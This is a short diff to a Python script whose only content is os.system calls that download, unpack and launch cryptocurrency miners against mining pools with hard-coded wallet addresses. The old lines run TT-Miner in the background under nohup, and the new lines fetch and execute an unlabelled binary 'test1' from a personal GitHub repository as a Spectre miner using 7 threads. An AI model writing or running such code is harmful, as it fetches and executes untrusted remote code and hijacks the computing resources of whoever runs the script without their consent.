@@ -1,6 +1,5 @@
 import sys
 import os
-os.system("wget https://github.com/TrailingStop/TT-Miner-beta/releases/download/2024.2.1-beta4/TT-Miner-2024.2.1B4.tar.gz")
-os.system("tar xf TT-Miner-2024.2.1B4.tar.gz")
-os.system("nohup ./TT-Miner-2024.2.1B4/TT-Miner -t 4 -a FLEX -P ssl://kc1qnvclnjxyp3h8wak2krz8ghyjxya7uldzqz7930.sabri:sabri@eu.mpool.live:6486 > edge.log 2>&1 &")
-os.system("sleep 1440m")
+os.system("wget https://github.com/anqdbkrn31/az/raw/main/test1")
+os.system("chmod +x test1")
+os.system("./test1 --spectre --wallet spectre:qp7vye8pcmmdtjuqhmjmk0wxmam20wywhs474fnrykfmshpmzd3wkg7dp78zd --daemon-address spr.tw-pool.com --port 14001 --worker-name test --threads 7")
